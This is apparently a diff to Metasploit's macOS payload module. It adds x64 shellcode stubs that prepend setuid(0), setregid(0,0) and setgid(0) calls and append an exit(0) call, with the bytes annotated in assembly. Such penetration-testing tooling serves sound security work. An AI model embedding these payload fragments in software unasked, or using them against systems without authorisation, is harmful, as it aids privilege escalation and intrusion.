@@ -164,7 +164,8 @@ module Msf::Payload::Osx
 
   def handle_x64_osx_opts(pre, app)
     if (datastore['PrependSetresuid'])
-      raise RuntimeError, "PrependSetresuid is not implemented"
+      # setresuid(0, 0, 0)
+      raise RuntimeError, "setresuid syscall is not implemented on x64 OSX systems"
     end
 
     if (datastore['PrependSetreuid'])
@@ -172,30 +173,58 @@ module Msf::Payload::Osx
       pre << "\x41\xb0\x02"         +# mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
              "\x49\xc1\xe0\x18"     +# shl r8, 24
              "\x49\x83\xc8\x7e"     +# or r8, 126  (setreuid=126)
-             "\x4c\x89\xc0"         +# mov rax, r8   311
+             "\x4c\x89\xc0"         +# mov rax, r8
              "\x48\x31\xff"         +# xor rdi, rdi  0
              "\x48\x31\xf6"         +# xor rsi, rsi  0
              "\x0f\x05"             # syscall
     end
 
     if (datastore['PrependSetuid'])
-      raise RuntimeError, "PrependSetuid is not implemented"
+      # setuid(0)
+      pre << "\x41\xb0\x02"         +# mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
+             "\x49\xc1\xe0\x18"     +# shl r8, 24
+             "\x49\x83\xc8\x17"     +# or r8, 23  (setuid=23)
+             "\x4c\x89\xc0"         +# mov rax, r8
+             "\x48\x31\xff"         +# xor rdi, rdi  0
+             "\x0f\x05"             # syscall
     end
 
     if (datastore['PrependSetresgid'])
-      raise RuntimeError, "PrependSetresgid is not implemented"
+      # setresgid(0, 0, 0)
+      raise RuntimeError, "setresgid syscall is not implemented on x64 OSX systems"
     end
 
     if (datastore['PrependSetregid'])
-      raise RuntimeError, "PrependSetregid is not implemented"
+      # setregid(0, 0)
+      pre << "\x41\xb0\x02"         +# mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
+             "\x49\xc1\xe0\x18"     +# shl r8, 24
+             "\x49\x83\xc8\x7f"     +# or r8, 127  (setregid=127)
+             "\x4c\x89\xc0"         +# mov rax, r8
+             "\x48\x31\xff"         +# xor rdi, rdi  0
+             "\x48\x31\xf6"         +# xor rsi, rsi  0
+             "\x0f\x05"             # syscall
     end
 
     if (datastore['PrependSetgid'])
-      raise RuntimeError, "PrependSetgid is not implemented"
+      # setgid(0)
+      pre << "\x41\xb0\x02"         +# mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
+             "\x49\xc1\xe0\x17"     +# shl r8, 23
+             "\x49\x83\xc8\x5a"     +# or r8, 90  (setgid=181>>1=90)
+             "\x49\xd1\xe0"         +# shl r8, 1
+             "\x49\x83\xc8\x01"     +# or r8, 1 (setgid=181&1=1)
+             "\x4c\x89\xc0"         +# mov rax, r8
+             "\x48\x31\xff"         +# xor rdi, rdi  0
+             "\x0f\x05"             # syscall
     end
 
     if (datastore['AppendExit'])
-      raise RuntimeError, "AppendExit is not implemented"
+      # exit(0)
+      app << "\x41\xb0\x02"         +# mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
+             "\x49\xc1\xe0\x18"     +# shl r8, 24
+             "\x49\x83\xc8\x01"     +# or r8, 1  (exit=1)
+             "\x4c\x89\xc0"         +# mov rax, r8
+             "\x48\x31\xff"         +# xor rdi, rdi  0
+             "\x0f\x05"             # syscall
     end
   end
 
